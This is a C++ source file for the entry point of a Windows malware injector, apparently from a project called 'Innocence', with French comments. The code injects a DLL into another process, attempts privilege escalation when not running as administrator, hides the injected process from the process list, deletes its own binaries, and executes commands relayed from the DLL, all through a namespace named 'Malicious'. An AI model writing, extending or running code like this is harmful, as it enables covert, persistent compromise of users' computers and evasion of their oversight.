#include <common/Innocence.hpp>
#include <log/Log.hpp>

#include "Inhibiter.hpp"
using namespace Inhibiter;

#include <malicious/Injector.hpp>
#include <malicious/ProcessHider.hpp>
#include <malicious/BinaryRessource.hpp>
#include <malicious/Elevator.hpp>
using namespace Malicious;

#include <system/Uac.hpp>
#include <system/System.hpp>
#include <system/Process.hpp>
#include <system/File.hpp>
using namespace System;

#include <common/WindowsWrapper.hpp>
#include <string>
#include <cstdlib>
using namespace std;

void ExecuteCommand(InhibiterCore& injector, const string& command);
void Inject(InhibiterCore& injector, const string& inhibitorPath);

int submain(int argc, char ** argv) {
	LOG.setIdentity(Common::identity);
	LOG.addObserver(new Log::LogToCollector);
	LOG.addObserver(new Log::LogToConsole);

	System::Process::This thisProcess;
	InhibiterCore injector (thisProcess.getProgramPath());
	LOG << "Program path : " + thisProcess.getProgramPath();
	LOG << "Arguments count : " + Common::toString(thisProcess.getArgCount());

	// l'injecteur a plusieurs utilités en plus d'injecter bêtement
	// la dll dans un processus, il va servir aussi a exécuter
	// certaines commandes que la DLL ne peut pas faire
	switch(thisProcess.getArgCount()) {
	case 1:
		// Pas d'argument au programme, on doit faire une injection
		Inject(injector, thisProcess.getArg(0));
		break;
	case 2:
		// Il y a un argument, c'est une commande demandée par la DLL
		ExecuteCommand(injector, thisProcess.getArg(1));
		break;
	default:
		// Il ne peut pas y avoir plus d'un argument
		LOG << "Bad argument number";
	}
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN

void ExecuteCommand(InhibiterCore& injector, const string& command) {
	TRACE_FUNCTION
	if(command == Common::UNINSTALL_CMD) {
		LOG << "Uninstall command";
		Sleep(1000);
		injector.uninstall();
		Malicious::DeleteMyself(Common::INHIBITER_EXE_NAME, Common::SELF_DELETE_CMD);
	} else if(command == Common::SELF_DELETE_CMD) {
		LOG << "Self delete command";
		Sleep(500);
		injector.finishUninstall();
	} else {
		LOG << "Injector installation finalizing";
		Sleep(300);
#ifndef INNOCENCE_DEBUG
		LOG << "Deleting old injector : " + command;
		if(!DeleteFile(command.c_str())) {
			LOG << "DeleteFile failed : " + Common::toString(GetLastError());
		} else
#else
		LOG << "No program deleting in debug mode";
#endif
		{
			LOG << "Injection...";
			injector.inject();
#ifndef INNOCENCE_DEBUG
			LOG << "Hiding myself from process list";
			try {
				ProcessHider hider;
				hider.hide(injector.getInjectedProcess());
			} catch(Common::Exception&) {
			}
#else
			LOG << "No process hiding in debug mode";
#endif
		}
	}
}

void Inject(InhibiterCore& injector, const string& inhibitorPath) {
	TRACE_FUNCTION
	if(!isAdministrator()) {
		if(elevate(inhibitorPath) == EXIT_SUCCESS) {
			LOG << "Privilege escalation passed";
		} else {
			LOG << "Privilege escalation failed";
		}
	} else if(injector.installed()) {
		LOG << "Injecting";
		injector.inject();
	} else {
		LOG << "Installing";
		injector.install();
	}
}
